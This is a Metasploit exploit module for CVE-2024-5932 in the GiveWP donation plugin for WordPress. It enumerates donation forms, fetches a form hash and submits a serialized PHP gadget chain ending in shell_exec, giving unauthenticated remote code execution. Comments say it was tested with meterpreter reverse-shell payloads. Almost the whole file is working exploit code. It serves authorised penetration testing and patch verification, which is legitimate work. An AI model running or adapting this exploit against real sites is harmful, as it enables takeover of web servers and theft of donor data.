##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GiveWP Unauthenticated Donation Process Exploit',
        'Description' => %q{
          The GiveWP Donation Plugin and Fundraising Platform plugin for WordPress in all versions up to and including 3.14.1 is vulnerable to a PHP Object Injection (POI) attack granting an unauthenticated arbitrary code execution.
        },

        'License' => MSF_LICENSE,
        'Author' => [
          'Villu Orav',         # Initial Discovery
          'EQSTSeminar',        # Proof of Concept
          'Julien Ahrens',      # Vulnerability Analysis
          'Valentin Lobstein'   # Metasploit Module
        ],
        'References' => [
          ['CVE', '2024-5932'],
          ['URL', 'https://github.com/EQSTSeminar/CVE-2024-5932'],
          ['URL', 'https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932'],
          ['URL', 'https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin']
        ],
        'DisclosureDate' => '2024-08-25',
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
      )
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    print_status("WordPress Version: #{wordpress_version}") if wordpress_version
    check_code = check_plugin_version_from_readme('give', '3.14.2')
    return CheckCode::Safe unless check_code.code == 'appears'

    print_good("Detected GiveWP Plugin version: #{check_code.details[:version]}")
    CheckCode::Appears
  end

  def exploit
    forms = fetch_form_list
    fail_with(Failure::UnexpectedReply, 'No forms found.') if forms.empty?

    selected_form = forms.sample
    valid_form = retrieve_and_analyze_form(selected_form['id'])

    return print_error('Failed to retrieve a valid form for exploitation.') unless valid_form

    print_status("Using Form ID: #{valid_form['give_form_id']} for exploitation.")
    send_exploit_request(
      valid_form['give_form_id'],
      valid_form['give_form_hash'],
      valid_form['give_price_id'],
      valid_form['give_amount']
    )
  end

  def fetch_form_list
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'data' => 'action=give_form_search'
    )

    return print_error('Failed to retrieve form list.') unless res&.code == 200

    forms = JSON.parse(res.body)
    form_ids = forms.map { |form| form['id'] }.sort

    print_good("Successfully retrieved form list. Available Form IDs: #{form_ids.join(', ')}")
    forms
  end

  def retrieve_and_analyze_form(form_id)
    form_res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_post' => { 'action' => 'give_donation_form_nonce', 'give_form_id' => form_id }
    )

    return unless form_res&.code == 200

    form_data = JSON.parse(form_res.body)
    give_form_id = form_id
    give_form_hash = form_data['data']
    give_price_id = '0'
    give_amount = '$10.00'
    # Somehow, can't randomize give_price_id and give_amount otherwise the exploit won't work.

    return unless give_form_hash

    {
      'give_form_id' => give_form_id,
      'give_form_hash' => give_form_hash,
      'give_price_id' => give_price_id,
      'give_amount' => give_amount
    }
  end

  def send_exploit_request(give_form_id, give_form_hash, give_price_id, give_amount)
    final_payload = format(
      'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";' \
      'O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{' \
      's:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";' \
      'O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";' \
      's:10:"shell_exec";s:12:"\\0*\\0generator";' \
      'O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{' \
      's:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%<length>d:"%<encoded>s";}}' \
      's:13:"\\0*\\0maxRetries";i:10;}}}}}}',
      length: payload.encoded.length,
      encoded: payload.encoded
    )

    data = {
      'give-form-id' => give_form_id,
      'give-form-hash' => give_form_hash,
      'give-price-id' => give_price_id,
      'give-amount' => give_amount,
      'give_first' => Faker::Name.first_name,
      'give_last' => Faker::Name.last_name,
      'give_email' => Faker::Internet.email,
      'give_title' => final_payload,
      'give-gateway' => 'offline',
      'action' => 'give_process_donation'
    }

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'data' => URI.encode_www_form(data)
    }, 0)
  end
end
